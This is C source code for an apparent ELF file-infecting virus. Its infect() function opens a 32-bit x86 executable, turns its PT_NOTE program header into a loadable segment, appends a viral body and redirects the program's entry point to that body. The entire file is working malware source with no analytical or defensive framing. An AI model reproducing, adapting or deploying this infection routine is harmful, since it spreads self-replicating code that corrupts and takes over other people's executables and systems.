/*
 *	By using this file, you agree to the terms and conditions set
 *	forth in the COPYING file which can be found at the top level
 *	of this distribution.
 */
#include <virus.h>
#include <elf.h>

int infect(char *name, uint vir_start, uint vir_size)
{
	int		h, l, i, r = 0, bs = 2048;
	unsigned int	va;
	unsigned char	*map;
	Elf32_Ehdr	*ehdr;
	Elf32_Phdr	*phdr, *note;
	unsigned char	buf[bs];

	if ((h = open(name, 2)) < 0)
		goto done;
	if ((l = lseek(h, 0, 2)) < 2048)
		goto close;
	map = (uchar*)mmap(NULL, l, PROT_READ|PROT_WRITE, MAP_SHARED, h, 0);
	if (map > (uchar*)0xfffff000)
		goto close;

	ehdr = (Elf32_Ehdr *)map;
	if (	*(uint*)ehdr->e_ident != 0x464c457f ||
		ehdr->e_type != ET_EXEC ||
		ehdr->e_machine != EM_386 ||
		(ehdr->e_ident[EI_OSABI] != 0 && ehdr->e_ident[EI_OSABI] != 3))
		goto unmap;

	va   = -1;
	note = NULL;
	phdr = (Elf32_Phdr *)(map + ehdr->e_phoff);
	for (i = 0; i < ehdr->e_phnum; i++, phdr++) {
		if (phdr->p_type == PT_NOTE)
			note = phdr;
		if (phdr->p_vaddr < va)
			va = phdr->p_vaddr;
	}
	if (va == -1 || note == NULL)
		goto unmap;

	va = ((va - (2 * PAGE_SIZE)) + (l & (PAGE_SIZE - 1)));
	i = make_body(ehdr->e_entry, va, vir_start, vir_size, buf);
	note->p_type	= PT_LOAD;
	note->p_offset	= l;
	note->p_vaddr	= note->p_paddr	= va;
	note->p_filesz	= note->p_memsz	= i;
	note->p_flags	= 6;
	note->p_align	= 0;

	if (write(h, buf, i) == i) {
		ehdr->e_entry = va;
		++r;
	}

	unmap:	munmap(map, l);
	close:	close(h);
	done:	return r;
}
